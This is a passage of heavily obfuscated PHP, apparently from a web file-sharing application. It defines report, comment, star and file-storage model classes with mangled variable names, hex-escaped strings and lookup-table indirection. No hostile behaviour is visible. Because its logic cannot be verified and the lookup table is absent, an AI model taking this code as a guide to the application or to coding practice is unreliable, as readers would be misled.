$_SERVER[ì™ı‰º¯]; $¾Éœ»Ã = array($·“¥ò[593] => $™©ú€äö[$·“¥ò[593]], $·“¥ò[1670] => USER_ID); if (Model($·“¥ò[2028])->where($¾Éœ»Ã)->find()) { return !1; } $¥Êıñ­Ø = array($·“¥ò[593] => $™©ú€äö[$·“¥ò[593]], $·“¥ò[1569] => $™©ú€äö[$·“¥ò[1569]], $·“¥ò[402] => $™©ú€äö[$·“¥ò[402]], $·“¥ò[468] => $™©ú€äö[$·“¥ò[468]], $·“¥ò[1670] => USER_ID, $·“¥ò[33] => $™©ú€äö[$·“¥ò[33]], $·“¥ò[453] => $™©ú€äö[$·“¥ò[453]]); return Model($·“¥ò[2028])->add($¥Êıñ­Ø); } public function reportList($ñ°çÄÓ¡) { $Îá–€â =& $_SERVER[ì™ı‰º¯]; $½Û¡¨ = array(); if ($ñ°çÄÓ¡[$Îá–€â[756]]) { $íæ˜áå‡ = $ñ°çÄÓ¡[$Îá–€â[757]] ? $ñ°çÄÓ¡[$Îá–€â[757]] : strtotime(date($Îá–€â[2030])); $½Û¡¨[$Îá–€â[201]] = array($Îá–€â[333], array($ñ°çÄÓ¡[$Îá–€â[756]], $íæ˜áå‡)); } if (isset($ñ°çÄÓ¡[$Îá–€â[33]]) && in_array($ñ°çÄÓ¡[$Îá–€â[33]], array($Îá–€â[88], $Îá–€â[437], $Îá–€â[2033], $Îá–€â[2034], $Îá–€â[2035]))) { $½Û¡¨[$Îá–€â[33]] = $ñ°çÄÓ¡[$Îá–€â[33]]; } if (isset($ñ°çÄÓ¡[$Îá–€â[745]]) && in_array($ñ°çÄÓ¡[$Îá–€â[745]], array($Îá–€â[198], $Îá–€â[88], $Îá–€â[437], $Îá–€â[2033]))) { $½Û¡¨[$Îá–€â[745]] = $ñ°çÄÓ¡[$Îá–€â[745]]; } $ç½”ìÚ = Input::get($Îá–€â[458], $Îá–€â[7], $Îá–€â[2032], array($Îá–€â[1950], $Îá–€â[452])); $‚Ò²–“ = array($Îá–€â[450] => $Îá–€â[451], $Îá–€â[452] => $Îá–€â[453]); $ãôÍ¢òà = $Îá–€â[2036] . $‚Ò²–“[$ç½”ìÚ]; $¡¹û‹×ß = Model($Îá–€â[2028])->where($½Û¡¨)->order($ãôÍ¢òà)->selectPage(20); if (empty($¡¹û‹×ß[$Îá–€â[369]])) { return array(); } $…Ù½¶£ = array_to_keyvalue_group($¡¹û‹×ß[$Îá–€â[369]], $Îá–€â[745], $Îá–€â[593]); if (!empty($…Ù½¶£[0])) { $ñ°çÄÓ¡ = $…Ù½¶£[0]; $½Û¡¨ = array($Îá–€â[593] => array($Îá–€â[7], $ñ°çÄÓ¡)); $ê§‡¡ÜÒ = $this->where($½Û¡¨)->field($Îá–€â[593])->select(); $ê§‡¡ÜÒ = array_to_keyvalue($ê§‡¡ÜÒ, $Îá–€â[12], $Îá–€â[593]); $Àˆà½´¶ = array_diff($ñ°çÄÓ¡, $ê§‡¡ÜÒ); if (!empty($Àˆà½´¶)) { foreach ($¡¹û‹×ß[$Îá–€â[369]] as $Ó¨ªÂù¾ => $Ôö°×È ) { if (in_array($Ôö°×È [$Îá–€â[593]], $Àˆà½´¶)) { unset($¡¹û‹×ß[$Îá–€â[369]][$Ó¨ªÂù¾]); } } } } $this->_listDataApply($¡¹û‹×ß[$Îá–€â[369]]); return $¡¹û‹×ß; } public function reportStatus($‘âŒˆñ) { $±ÒÌÊøâ =& $_SERVER[ì™ı‰º¯]; $ë•×Şø = array($±ÒÌÊøâ[399] => $‘âŒˆñ[$±ÒÌÊøâ[399]]); $äã·Ñ—å = Model($±ÒÌÊøâ[2028])->where($ë•×Şø)->field($±ÒÌÊøâ[2037])->find(); if (!$äã·Ñ—å) { return !1; } $Ê…ƒÅØ = array($±ÒÌÊøâ[745] => $‘âŒˆñ[$±ÒÌÊøâ[745]]); if ($‘âŒˆñ[$±ÒÌÊøâ[745]] == $±ÒÌÊøâ[2033] && $äã·Ñ—å[$±ÒÌÊøâ[745]] == $±ÒÌÊøâ[2033]) { $Ê…ƒÅØ[$±ÒÌÊøâ[745]] = 0; } $İöÕ²äµ = Model($±ÒÌÊøâ[2028])->where($ë•×Şø)->save($Ê…ƒÅØ); if ($‘âŒˆñ[$±ÒÌÊøâ[745]] == $±ÒÌÊøâ[437]) { if ($äã·Ñ—å[$±ÒÌÊøâ[468]] != $±ÒÌÊøâ[198] && $this->shareFileMeta($äã·Ñ—å[$±ÒÌÊøâ[468]])) { $this->shareFileMeta($äã·Ñ—å[$±ÒÌÊøâ[468]], 0); } $this->remove($äã·Ñ—å[$±ÒÌÊøâ[593]]); return !0; } if ($İöÕ²äµ && $‘âŒˆñ[$±ÒÌÊøâ[745]] == $±ÒÌÊøâ[2033]) { $á¸“¤çˆ = $Ê…ƒÅØ[$±ÒÌÊøâ[745]] == $±ÒÌÊøâ[2033] ? 1 : 0; $this->shareFileMeta($äã·Ñ—å[$±ÒÌÊøâ[468]], $á¸“¤çˆ); $this->removeByFile($äã·Ñ—å[$±ÒÌÊøâ[468]]); } return $İöÕ²äµ; } private function removeByFile($õÚäº) { $‚ŞÆĞ™í =& $_SERVER[ì™ı‰º¯]; $ŸæÎù¤ = Model($‚ŞÆĞ™í[821])->where(array($‚ŞÆĞ™í[468] => $õÚäº))->field($‚ŞÆĞ™í[402])->select(); $ƒ´«„²Ç = array_to_keyvalue($ŸæÎù¤, $‚ŞÆĞ™í[12], $‚ŞÆĞ™í[402]); $òß„‰ôâ = array($‚ŞÆĞ™í[402] => array($‚ŞÆĞ™í[7], $ƒ´«„²Ç), $‚ŞÆĞ™í[488] => 1); $ŸæÎù¤ = $this->where($òß„‰ôâ)->field($‚ŞÆĞ™í[593])->select(); if (empty($ŸæÎù¤)) { return; } $‡ô¸ğ±• = array_to_keyvalue($ŸæÎù¤, $‚ŞÆĞ™í[12], $‚ŞÆĞ™í[593]); $this->remove($‡ô¸ğ±•); } private function shareFileMeta($Ñ¨¹¨òÔ, $øî¥±ã¤ = null) { $±ª€ğ´Ş =& $_SERVER[ì™ı‰º¯]; $°÷ØìÏ¹ = array($±ª€ğ´Ş[468] => $Ñ¨¹¨òÔ, $±ª€ğ´Ş[94] => $±ª€ğ´Ş[2038]); if (is_null($øî¥±ã¤)) { return Model($±ª€ğ´Ş[2039])->where($°÷ØìÏ¹)->find(); } $°÷ØìÏ¹[$±ª€ğ´Ş[374]] = $øî¥±ã¤; Model($±ª€ğ´Ş[2039])->add($°÷ØìÏ¹, array(), !0); } } goto f¥”ºšæÙö; E¿Ş–Ù‘– : class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\x65\x6e\x74"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\155\x65" => "\143\x6f\155\x6d\x65\x6e\164\137\x6d\145\164\x61", "\x6d\145\164\141\106\x69\145\154\x64" => "\x63\x6f\x6d\x6d\145\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($õôöşµ) { $±Ğ·–ÓŞ =& $_SERVER[ì™ı‰º¯]; if ($õôöşµ[$±Ğ·–ÓŞ[1888]]) { $¤‚®÷Ô‘ = $this->where(array($±Ğ·–ÓŞ[1889] => $õôöşµ[$±Ğ·–ÓŞ[1888]]))->find(); if (!$¤‚®÷Ô‘ || $¤‚®÷Ô‘[$±Ğ·–ÓŞ[411]] != $õôöşµ[$±Ğ·–ÓŞ[411]] || $¤‚®÷Ô‘[$±Ğ·–ÓŞ[496]] != $õôöşµ[$±Ğ·–ÓŞ[496]]) { return !1; } $this->where(array($±Ğ·–ÓŞ[1889] => $õôöşµ[$±Ğ·–ÓŞ[1888]]))->setAdd($±Ğ·–ÓŞ[1890], 1); } $õôöşµ[$±Ğ·–ÓŞ[1891]] = 0; $õôöşµ[$±Ğ·–ÓŞ[1890]] = 0; $õôöşµ[$±Ğ·–ÓŞ[745]] = 1; return $this->add($õôöşµ); } public function commentCount($ä„æœ‘‚, $ŞÒºù×, $¦²´¡¬Ç = false) { $¼×µ¼Ğâ =& $_SERVER[ì™ı‰º¯]; if (!$ä„æœ‘‚) { return array(); } if (is_string($ä„æœ‘‚) || is_int($ä„æœ‘‚)) { $ä„æœ‘‚ = array($ä„æœ‘‚); } $ä¯ÇÍç‚ = array($¼×µ¼Ğâ[496], $¼×µ¼Ğâ[1892] => $¼×µ¼Ğâ[491]); $Úëâãı‚ = array($¼×µ¼Ğâ[496] => array($¼×µ¼Ğâ[7], $ä„æœ‘‚), $¼×µ¼Ğâ[411] => $ŞÒºù×); if ($¦²´¡¬Ç) { $Úëâãı‚[$¼×µ¼Ğâ[1670]] = $¦²´¡¬Ç; } $°ğíœ°“ = $this->field($ä¯ÇÍç‚)->where($Úëâãı‚)->group($¼×µ¼Ğâ[496])->select(); return array_to_keyvalue($°ğíœ°“, $¼×µ¼Ğâ[496], $¼×µ¼Ğâ[491]); } public function starTarget($Õ²¨ÜôÚ, $ØøÀøÚ) { $ê½œò‹ =& $_SERVER[ì™ı‰º¯]; $Ûº±Í˜€ = $Õ²¨ÜôÚ + self::TYPE_STAR_OFFSET; $û¤Ò±÷û = array($ê½œò‹[1670] => USER_ID, $ê½œò‹[411] => $Ûº±Í˜€, $ê½œò‹[496] => $ØøÀøÚ); $ˆÍüÍ¼ü = $this->where($û¤Ò±÷û)->find(); if ($ˆÍüÍ¼ü) { return $this->where(array($ê½œò‹[399] => $ˆÍüÍ¼ü[$ê½œò‹[399]]))->delete(); } $±òú™Œ” = array($ê½œò‹[1888] => 0, $ê½œò‹[1670] => USER_ID, $ê½œò‹[745] => 1, $ê½œò‹[750] => $ê½œò‹[12], $ê½œò‹[411] => $Ûº±Í˜€, $ê½œò‹[496] => $ØøÀøÚ, $ê½œò‹[1891] => 0, $ê½œò‹[1890] => 0); return $this->add($±òú™Œ”); } public function starTargetCount($¢ë¨ËÙ, $ÆöŒË‚Å) { $ÓŠº¶ =& $_SERVER[ì™ı‰º¯]; $é¾“ñê = $ÆöŒË‚Å + self::TYPE_STAR_OFFSET; $ö´âäÌ = $this->commentCount($¢ë¨ËÙ, $é¾“ñê); $ØîèÖ²ã = $this->commentCount($¢ë¨ËÙ, $é¾“ñê, USER_ID); return array($ÓŠº¶[1893] => $ö´âäÌ, $ÓŠº¶[1894] => $ØîèÖ²ã); } public function starTargetUserList($—Ê¥û¯ˆ, $šõ®”¹á) { $Õëá´£Ë =& $_SERVER[ì™ı‰º¯]; $–„¼«¾ƒ = $—Ê¥û¯ˆ + self::TYPE_STAR_OFFSET; $Øì°©¿ª = array($Õëá´£Ë[496] => $šõ®”¹á, $Õëá´£Ë[411] => $–„¼«¾ƒ); $«úéËšÛ = $this->where($Øì°©¿ª)->count(); $Í€éÄ£× = array($Õëá´£Ë[255] => $«úéËšÛ, $Õëá´£Ë[1895] => array()); if (!$«úéËšÛ) { return $Í€éÄ£×; } $ÒÙËĞŸ = $this->field($Õëá´£Ë[1670])->where($Øì°©¿ª)->limit(500)->select(); $ÒÙËĞŸ = array_to_keyvalue($ÒÙËĞŸ, $Õëá´£Ë[12], $Õëá´£Ë[1670]); $Í€éÄ£×[$Õëá´£Ë[1895]] = Model($Õëá´£Ë[504])->userListInfo($ÒÙËĞŸ); return $Í€éÄ£×; } public function prasiseUserList($ê´®) { $şõ¬éè =& $_SERVER[ì™ı‰º¯]; $˜¹àÙÂ² = array($şõ¬éè[1896] => $ê´®); $½—·û¾ = $this->where($˜¹àÙÂ²)->find(); $Ñ°Ÿô‘‹ = _get($½—·û¾, $şõ¬éè[1891], 0); $«ô¤ãˆ = array($şõ¬éè[255] => $Ñ°Ÿô‘‹, $şõ¬éè[1895] => array()); if (!$Ñ°Ÿô‘‹) { return $«ô¤ãˆ; } $Úµƒ¶ = Model($şõ¬éè[1897])->field($şõ¬éè[1670])->where($˜¹àÙÂ²)->limit(500)->select(); $Úµƒ¶ = array_to_keyvalue($Úµƒ¶, $şõ¬éè[12], $şõ¬éè[1670]); $«ô¤ãˆ[$şõ¬éè[1895]] = Model($şõ¬éè[504])->userListInfo($Úµƒ¶); return $«ô¤ãˆ; } public function remove($‹õËçº¾) { $¿Ú”»ÀŞ =& $_SERVER[ì™ı‰º¯]; $Ù€‚Ï¿§ = array($¿Ú”»ÀŞ[1889] => $‹õËçº¾); $¶¡Ã¬ğ” = $this->where($Ù€‚Ï¿§)->find(); if ($¶¡Ã¬ğ”[$¿Ú”»ÀŞ[1888]]) { $this->where(array($¿Ú”»ÀŞ[1889] => $¶¡Ã¬ğ”[$¿Ú”»ÀŞ[1888]]))->setAdd($¿Ú”»ÀŞ[1890], -1); } return $this->where($Ù€‚Ï¿§)->delete(); } public function edit($´¢¢éŠú, $¢Óçãê¡) { $Ò½€ƒçú =& $_SERVER[ì™ı‰º¯]; $’½§òí‚ = array($Ò½€ƒçú[1889] => $´¢¢éŠú); return $this->where($’½§òí‚)->save(array($Ò½€ƒçú[1898] => $¢Óçãê¡)); } public function prasise($íõ ˜ŞÚ) { $ô¶˜œ =& $_SERVER[ì™ı‰º¯]; $×¬†¯Üé = Model($ô¶˜œ[1899]); $Ãóò’™­ = array($ô¶˜œ[1889] => $íõ ˜ŞÚ, $ô¶˜œ[1661] => USER_ID); $ˆúªõùâ = $×¬†¯Üé->where($Ãóò’™­)->find(); if (!$ˆúªõùâ) { $×¬†¯Üé->add($Ãóò’™­); $¶şüÚ²í = $this->where(array($ô¶˜œ[1889] => $íõ ˜ŞÚ))->setAdd($ô¶˜œ[1891], 1); } else { $×¬†¯Üé->where($Ãóò’™­)->delete(); $¶şüÚ²í = $this->where(array($ô¶˜œ[1889] => $íõ ˜ŞÚ))->setAdd($ô¶˜œ[1891], -1); } return $¶şüÚ²í; } public function targetInfo($½¬ÛÁ€, $»¿ü¼é) { $Š‘»áÚè =& $_SERVER[ì™ı‰º¯]; $Û´÷ö¢ú = array($Š‘»áÚè[576] => $½¬ÛÁ€, $Š‘»áÚè[577] => $»¿ü¼é); $Œºî²°Œ = $this->where($Û´÷ö¢ú)->count(); $íÊãğï = "\x52\111\x47\110\124\40\112\117\x49\116\40{$this->tablePrefix}\x63\x6f\155\x6d\x65\x6e\164\137\x70\162\x61\151\x73\x65\40\x73\164\141\x72\x20\x6f\x6e\x20\x63\x6f\155\x6d\145\x6e\164\x2e\143\x6f\155\155\x65\156\164\111\x44\x20\x3d\x20\x73\x74\141\162\56\143\x6f\x6d\155\x65\x6e\x74\x49\x44"; $ùİ°áÙ = $this->alias($Š‘»áÚè[354])->where($Û´÷ö¢ú)->join($íÊãğï, $Š‘»áÚè[1900])->count(); $€Âèƒöš = array($Š‘»áÚè[1901] => $Œºî²°Œ, $Š‘»áÚè[1902] => $ùİ°áÙ); return $€Âèƒöš; } public function listData($½ªÇ‡ã·) { $úš‚áˆ =& $_SERVER[ì™ı‰º¯]; if (isset($½ªÇ‡ã·[$úš‚áˆ[1903]])) { if ($½ªÇ‡ã·[$úš‚áˆ[1903]]) { $½ªÇ‡ã·[$úš‚áˆ[1896]] = array($úš‚áˆ[1013], intval($½ªÇ‡ã·[$úš‚áˆ[1903]])); } unset($½ªÇ‡ã·[$úš‚áˆ[1903]]); } if (isset($½ªÇ‡ã·[$úš‚áˆ[1904]])) { if ($½ªÇ‡ã·[$úš‚áˆ[1904]]) { $½ªÇ‡ã·[$úš‚áˆ[1896]] = array($úš‚áˆ[1010], intval($½ªÇ‡ã·[$úš‚áˆ[1904]])); } unset($½ªÇ‡ã·[$úš‚áˆ[1904]]); } return $this->_listData($½ªÇ‡ã·); } private function _listData($¢Ğ„¦š) { $ç‰ÚÇ©´ =& $_SERVER[ì™ı‰º¯]; $•Ò©•ê = $this->where($¢Ğ„¦š)->_makeOrder()->selectPage(100); $this->_listAppendParent($•Ò©•ê[$ç‰ÚÇ©´[369]]); $this->_listAppendUser($•Ò©•ê[$ç‰ÚÇ©´[369]]); $this->_listAppendMeta($•Ò©•ê[$ç‰ÚÇ©´[369]]); return $•Ò©•ê; } private function _makeOrder() { $‚ş—Ìô³ =& $_SERVER[ì™ı‰º¯]; $æéêŸ‚ = array($‚ş—Ìô³[1891], $‚ş—Ìô³[1890], $‚ş—Ìô³[201]); $àìÁ³»˜ = Input::get($‚ş—Ìô³[457], $‚ş—Ìô³[7], $‚ş—Ìô³[423], $æéêŸ‚); $ì­£¤¯ê = Input::get($‚ş—Ìô³[458], $‚ş—Ìô³[7], $‚ş—Ìô³[1663], array($‚ş—Ìô³[1905], $‚ş—Ìô³[453])); $İŒ•ëîà = $àìÁ³»˜ . $‚ş—Ìô³[53] . $ì­£¤¯ê; return $this->order($İŒ•ëîà); } private function _listAppendParent(&$èÍÑ‹âÉ) { $„Ûê¼é =& $_SERVER[ì™ı‰º¯]; $Ğü¦àÎÇ = array_unique(array_to_keyvalue($èÍÑ‹âÉ, $„Ûê¼é[12], $„Ûê¼é[1888])); $Ğü¦àÎÇ = array_remove_value($Ğü¦àÎÇ, $„Ûê¼é[198]); if (!$Ğü¦àÎÇ) { return; } $Êı²—ÍÖ = $this->where(array($„Ûê¼é[1889] => array($„Ûê¼é[7], $Ğü¦àÎÇ)))->select(); $Êı²—ÍÖ = array_to_keyvalue($Êı²—ÍÖ, $„Ûê¼é[1896]); foreach ($èÍÑ‹âÉ as &$Å‡±ï×ç) { if (isset($Êı²—ÍÖ[$Å‡±ï×ç[$„Ûê¼é[1888]]])) { $Å‡±ï×ç[$„Ûê¼é[1906]] = $Êı²—ÍÖ[$Å‡±ï×ç[$„Ûê¼é[1888]]]; } } unset($Å‡±ï×ç); } private function _listAppendUser(&$¼¶’½”) { $Û»ñûìŸ =& $_SERVER[ì™ı‰º¯]; $…Ùã­ = array_unique(array_to_keyvalue($¼¶’½”, $Û»ñûìŸ[12], $Û»ñûìŸ[1670])); $…Ùã­ = array_remove_value($…Ùã­, $Û»ñûìŸ[198]); if (count($…Ùã­) == 0) { return; } foreach ($¼¶’½” as $ÍƒÚæşÊ) { if (isset($ÍƒÚæşÊ[$Û»ñûìŸ[1906]])) { $…Ùã­[] = $ÍƒÚæşÊ[$Û»ñûìŸ[1906]][$Û»ñûìŸ[1670]]; } } $õ‚‡”™Ô = Model($Û»ñûìŸ[525])->userListInfo($…Ùã­); foreach ($¼¶’½” as &$ÍƒÚæşÊ) { $ÍƒÚæşÊ[$Û»ñûìŸ[590]] = $õ‚‡”™Ô[$ÍƒÚæşÊ[$Û»ñûìŸ[1670]]]; if (isset($ÍƒÚæşÊ[$Û»ñûìŸ[1906]])) { $ÍƒÚæşÊ[$Û»ñûìŸ[1906]][$Û»ñûìŸ[590]] = $õ‚‡”™Ô[$ÍƒÚæşÊ[$Û»ñûìŸ[1906]][$Û»ñûìŸ[1670]]]; } } unset($ÍƒÚæşÊ); } private function _listAppendMeta(&$‘·©Ÿ²Ç) { $’¤‡ØÏá =& $_SERVER[ì™ı‰º¯]; $»æî‹½ = array_unique(array_to_keyvalue($‘·©Ÿ²Ç, $’¤‡ØÏá[12], $’¤‡ØÏá[1896])); $»æî‹½ = array_remove_value($»æî‹½, $’¤‡ØÏá[198]); if (!$»æî‹½) { return; } foreach ($‘·©Ÿ²Ç as $ˆ«”ø¼Ô) { if (isset($ˆ«”ø¼Ô[$’¤‡ØÏá[1906]])) { $»æî‹½[] = $ˆ«”ø¼Ô[$’¤‡ØÏá[1906]][$’¤‡ØÏá[1896]]; } } $Š–òÕåî = $this->metaList($»æî‹½); if (!$Š–òÕåî) { return !1; } foreach ($‘·©Ÿ²Ç as &$ˆ«”ø¼Ô) { $ˆ«”ø¼Ô[$’¤‡ØÏá[466]] = $Š–òÕåî[$ˆ«”ø¼Ô[$’¤‡ØÏá[1896]]]; if (isset($ˆ«”ø¼Ô[$’¤‡ØÏá[1906]])) { $ˆ«”ø¼Ô[$’¤‡ØÏá[1906]][$’¤‡ØÏá[466]] = $Š–òÕåî[$ˆ«”ø¼Ô[$’¤‡ØÏá[1906]][$’¤‡ØÏá[1896]]]; } } unset($ˆ«”ø¼Ô); } private function metaList($Şú¶©ã) { $Ôæ ¤Í  =& $_SERVER[ì™ı‰º¯]; if (!$Şú¶©ã) { return array(); } $ô…Œ­Ï‹ = array($Ôæ ¤Í [1896] => array($Ôæ ¤Í [7], $Şú¶©ã)); $Ÿôê¸³À = Model($Ôæ ¤Í [1907])->where($ô…Œ­Ï‹)->select(); $Ÿôê¸³À = array_to_keyvalue_group($Ÿôê¸³À, $Ôæ ¤Í [1896]); foreach ($Ÿôê¸³À as $²Æ–» => $¯ñœê–ç) { $²ô¿ô¼Ï = array(); foreach ($¯ñœê–ç as $­şŞÈÜ) { $²ô¿ô¼Ï[$­şŞÈÜ[$Ôæ ¤Í [94]]] = $­şŞÈÜ[$Ôæ ¤Í [374]]; } $Ÿôê¸³À[$²Æ–»] = $²ô¿ô¼Ï; } return $Ÿôê¸³À ? $Ÿôê¸³À : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\154\145\137\143\157\x6e\x74\145\156\x74\163"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\124\x69\x6d\145", "\164\x69\155\x65", "\151\x6e\163\145\x72\x74", "\146\x75\x6e\x63\164\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\154\145"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\x6d\145" => "\151\157\137\x66\151\154\145\137\x6d\145\x74\x61", "\155\x65\164\x61\106\x69\145\154\144" => "\x66\x69\154\x65\111\x44"); public function fileInfo($½ÕªÇÉ) { $‘‚—‹±€ =& $_SERVER[ì™ı‰º¯]; static $ôì¾’µ‹ = array(); if (!isset($ôì¾’µ‹[$½ÕªÇÉ])) { $ğú™Ö©Ñ = $‘‚—‹±€[1908]; $Ü¨ˆºƒç = Model($‘‚—‹±€[471])->field($ğú™Ö©Ñ)->where(array($‘‚—‹±€[469] => $½ÕªÇÉ))->find(); $ôì¾’µ‹[$½ÕªÇÉ] = $Ü¨ˆºƒç; } return $ôì¾’µ‹[$½ÕªÇÉ]; } public function addFileByContent($¬¥¢çàæ = '', $Â—Ù· š = '') { $†Äå˜Ç¸ =& $_SERVER[ì™ı‰º¯]; $ò¹°²§ = TEMP_PATH . $†Äå˜Ç¸[1909]; if (!is_dir($ò¹°²§)) { mk_dir($ò¹°²§); } $¥¿¶¬šò = $ò¹°²§ . $†Äå˜Ç¸[1910] . rand_string(16); file_put_contents($¥¿¶¬šò, $¬¥¢çàæ); $ÆÑ†Šã¬ = $this->addFile($¥¿¶¬šò, $Â—Ù· š, !0); if (file_exists($¥¿¶¬šò)) { @unlink($¥¿¶¬šò); } return $ÆÑ†Šã¬; } public function createFileName($ÉÖö–, $’Í£‰” = false, $ä±ÆŞÑš = false) { $­‚ã±Ö =& $_SERVER[ì™ı‰º¯]; $›ˆ‹êê³ = IO::init($­‚ã±Ö[8]); $ØÁÔ‰¼ = $this->makeFilePath($ÉÖö–, $›ˆ‹êê³, $’Í£‰”, $ä±ÆŞÑš); $ÍŠ‚¬Ò¿ = $›ˆ‹êê³->pathFather($ØÁÔ‰¼); static $¢ œ„«Ä = false; $¨†úÊ€ = $­‚ã±Ö[1911] . md5($ÍŠ‚¬Ò¿); if (!$¢ œ„«Ä && !Cache::get($¨†úÊ€)) { $¢ œ„«Ä = !0; $¸Ò‘ÑÄã = IO::mkdir($ÍŠ‚¬Ò¿); if (!IO::exist($¸Ò‘ÑÄã . $­‚ã±Ö[793])) { IO::mkfile($¸Ò‘ÑÄã . $­‚ã±Ö[793]); } Cache::set($¨†úÊ€, 1, 3600 * 2); } return $ØÁÔ‰¼; } public function makeFilePath($œÏĞƒËÂ, $¥ÆÁìœ¥, $œÑÄ£Ìë = false, $âôàõæ¨ = false) { $ò²Ö ë¨ =& $_SERVER[ì™ı‰º¯]; $ÑŒ™õ¾ï = Model($ò²Ö ë¨[766])->get($ò²Ö ë¨[1912]); $§®Ş’ˆ„ = KodIO::defaultIO() . date($ò²Ö ë¨[1913]); $Ã¢•í¢¥ = $§®Ş’ˆ„ . rand_string(5) . short_id(100); $œÏĞƒËÂ = str_replace($ò²Ö ë¨[8], $ò²Ö ë¨[11], KodIO::clear($œÏĞƒËÂ)); $í¡æŸÈÙ = $¥ÆÁìœ¥->ext($œÏĞƒËÂ); if (!$œÏĞƒËÂ) { $ÑŒ™õ¾ï = $ò²Ö ë¨[1914]; } switch ($ÑŒ™õ¾ï) { case $ò²Ö ë¨[1915]: $Ã¢•í¢¥ = $Ã¢•í¢¥ . $ò²Ö ë¨[10] . $¥ÆÁìœ¥->ext($œÏĞƒËÂ); if ($í¡æŸÈÙ == $ò²Ö ë¨[1852]) { $Ã¢•í¢¥ .= $ò²Ö ë¨[1205]; } break; case $ò²Ö ë¨[1916]: $¿Ò˜…“ = Model($ò²Ö ë¨[766])->get($ò²Ö ë¨[767]); $òÑ›¡ß = substr(md5($ò²Ö ë¨[768] . $¿Ò˜…“ . date($ò²Ö ë¨[743])), 0, 8); $±š¬Ş = KodIO::defaultDriver(); $§®Ş’ˆ„ = $ò²Ö ë¨[1236] . $±š¬Ş[$ò²Ö ë¨[399]] . $ò²Ö ë¨[409] . date($ò²Ö ë¨[1917]) . $òÑ›¡ß . $ò²Ö ë¨[8]; if ($í¡æŸÈÙ == $ò²Ö ë¨[1852]) { $œÏĞƒËÂ .= $ò²Ö ë¨[1205]; } $øä³Š»ä = $ò²Ö ë¨[1918] . $§®Ş’ˆ„ . $œÏĞƒËÂ; CacheLock::lock($øä³Š»ä); $Ã¢•í¢¥ = $§®Ş’ˆ„ . $œÏĞƒËÂ; if (IO::exist($§®Ş’ˆ„ . $œÏĞƒËÂ)) { $ç¦ğûÒ  = substr($œÏĞƒËÂ, 0, strlen($œÏĞƒËÂ) - strlen($í¡æŸÈÙ)); $õ¼»Ş’õ = $âôàõæ¨ ? substr($âôàõæ¨, 0, 5) : ($œÑÄ£Ìë ? substr($œÑÄ£Ìë, 0, 5) : rand_string(5)); $Ã¢•í¢¥ = $§®Ş’ˆ„ . $ç¦ğûÒ  . $õ¼»Ş’õ . $ò²Ö ë¨[10] . $í¡æŸÈÙ; } if (IO::isTypeObject($Ã¢•í¢¥) && !IO::isUploadServer($Ã¢•í¢¥)) { if (IO::exist($Ã¢•í¢¥)) { return $Ã¢•í¢¥; } $¢ç£ÒÀİ = IO::setContent($Ã¢•í¢¥, $ò²Ö ë¨[12]); if (!$¢ç£ÒÀİ) { show_json($ò²Ö ë¨[1919], !1); } } CacheLock::unlock($øä³Š»ä); break; case $ò²Ö ë¨[1914]: break; default: break; } return $Ã¢•í¢¥; } public function addFileByRemote($—‚”Ã¿–, $õ¨¬ş¨Ã, $ˆš¼Ú” = array()) { $ä•Ñ­§ =& $_SERVER[ì™ı‰º¯]; if (!IO::exist($—‚”Ã¿–)) { return !1; } $”ßßÇŞ = $ˆš¼Ú”[$ä•Ñ­§[176]] ? $ˆš¼Ú”[$ä•Ñ­§[176]] : $ä•Ñ­§[12]; $¦¤ÏƒÈÀ = IO::hashMd5($—‚”Ã¿–, $”ßßÇŞ); $‡ß©ñ«ğ = KodIO::defaultDriver(); $ÓºÏáŞÎ = array($ä•Ñ­§[545] => IO::size($—‚”Ã¿–), $ä•Ñ­§[1920] => 1, $ä•Ñ­§[420] => $õ¨¬ş¨Ã, $ä•Ñ­§[804] => $‡ß©ñ«ğ[$ä•Ñ­§[399]], $ä•Ñ­§[421] => $—‚”Ã¿–, $ä•Ñ­§[1921] => $ˆš¼Ú”[$ä•Ñ­§[177]] ? $ˆš¼Ú”[$ä•Ñ­§[177]] : IO::hashSimple($—‚”Ã¿–), $ä•Ñ­§[1922] => $¦¤ÏƒÈÀ ? $¦¤ÏƒÈÀ : $”ßßÇŞ); if ($Êşåı÷ = $this->addFileCheckExist($ÓºÏáŞÎ[$ä•Ñ­§[177]], $ÓºÏáŞÎ[$ä•Ñ­§[176]], $ÓºÏáŞÎ[$ä•Ñ­§[76]])) { return $Êşåı÷; } return $this->addFileData($ÓºÏáŞÎ); } private function addFileData($­‹Ôà²) { $áÑÃ„üÜ =& $_SERVER[ì™ı‰º¯]; if (!$­‹Ôà²) { return !1; } $­‹Ôà²[$áÑÃ„üÜ[76]] = intval($­‹Ôà²[$áÑÃ„üÜ[76]]); if (!$­‹Ôà²[$áÑÃ„üÜ[76]] && strlen($­‹Ôà²[$áÑÃ„üÜ[177]]) > 32) { $­‹Ôà²[$áÑÃ„üÜ[76]] = intval(substr($­‹Ôà²[$áÑÃ„üÜ[177]], 32)); } $á€Èî¡ô = $this->add($­‹Ôà²); return $this->find($á€Èî¡ô); } public function addFile($¥ÕÊ‘Á‘, $ç§ö„ÛÑ, $ëÈî×—ğ = false) { $­ÚŞÒÙâ =& $_SERVER[ì™ı‰º¯]; $äœ¸ûŠŸ = IO::hashSimple($¥ÕÊ‘Á‘); $Ê²¨ì¸ = IO::size($¥ÕÊ‘Á‘); $³Á†îß¨ = $Ê²¨ì¸ <= 1024 * 1024 * 10 ? IO::hashMd5($¥ÕÊ‘Á‘) : $­ÚŞÒÙâ[12]; $·‚Å¡…° = $­ÚŞÒÙâ[1923] . $äœ¸ûŠŸ; CacheLock::lock($·‚Å¡…°); if ($³Á†îß¨ && $äœ¸ûŠŸ) { $Ÿ»àßÑ¬ = $this->addFileCheckExist($äœ¸ûŠŸ, $³Á†îß¨, $Ê²¨ì¸); if ($Ÿ»àßÑ¬) { CacheLock::unlock($·‚Å¡…°); 